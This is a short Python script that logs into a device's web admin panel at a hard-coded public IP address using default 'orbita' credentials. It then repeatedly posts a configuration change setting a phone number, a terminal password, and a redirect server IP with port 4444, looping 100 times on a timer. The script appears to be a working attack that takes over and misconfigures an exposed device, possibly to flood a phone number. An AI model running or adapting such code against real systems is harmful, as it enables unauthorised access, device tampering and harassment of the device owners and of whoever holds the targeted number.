import requests
import time


NUMBER='+79XXXXXXXXX'
session = requests.Session()
#session.headers.update({'User-Agent': 'LOL :^)'})
login = {'login': 'orbita', 'pass': 'orbita'}
auth1 = session.post('http://109.111.183.33:41880/orbita/auth/', data=login)

"""
conf2 = session.post('http://109.111.183.33:41880/orbita/config/?a=2', {'phone': '{}'.format(NUMBER),
                                                                        'pass_terminal': '451987',
                                                                        'server_ip1': "89.189.179.12",
                                                                        'server_port1': '4444',
                                                                        'ring_sel': '1',
                                                                        'id': '1111'})
"""


for i in range(1, 101):
    
    time.sleep(10)
    
    session.post('http://109.111.183.33:41880/orbita/config/?a=2', {'phone': '{}'.format(NUMBER),
                                                                            'pass_terminal': '451987',
                                                                            'server_ip1': "89.189.179.12",
                                                                            'server_port1': '4444',
                                                                            'ring_sel': '1',
                                                                            'id': '1111'})
    print('[{}]: send >> {}'.format(i, NUMBER))
    

